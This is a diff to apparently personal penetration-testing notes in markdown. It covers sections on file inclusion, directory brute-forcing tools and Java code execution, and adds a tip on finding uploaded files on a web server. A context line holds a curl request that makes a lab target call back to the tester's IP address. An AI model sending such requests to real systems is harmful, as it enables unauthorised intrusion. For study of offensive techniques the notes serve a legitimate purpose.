@@ -1,9 +1,10 @@
-[Local File Inclusion](#local-file-inclusion)
-[Remote File Inclusion](#remote-file-inclusion)
-[Curl](#curl)
-[Gobuster](#gobuster)
-[Feroxbuster](#feroxbuster)
-[Java Code Execution](#java-code-execution)
+- [Local File Inclusion](#local-file-inclusion)
+- [Remote File Inclusion](#remote-file-inclusion)
+- [Curl](#curl)
+- [Gobuster](#gobuster)
+- [Feroxbuster](#feroxbuster)
+- [File Upload Vulnerability](#file-upload-vulnerability)
+- [Java Code Execution](#java-code-execution)
 
 
 # Local File Inclusion
@@ -31,6 +32,16 @@
 curl -X POST -d '{"user":"clumsyadmin", "url":"http://192.168.45.175:443/list-running-procs"}' http://192.168.163.99:33333/list-running-procs
 ```
 
+
+# File Upload Vulnerability
+```bash
+# always check root after uploading something
+http://example.com/uploadedsomething.txt
+http://example.com/upload/uploadedsomething.txt
+http://example.com/uploads/uploadedsomething.txt
+
+
+```
 
 
 # Java Code Execution (C:/Windows/Temp/)
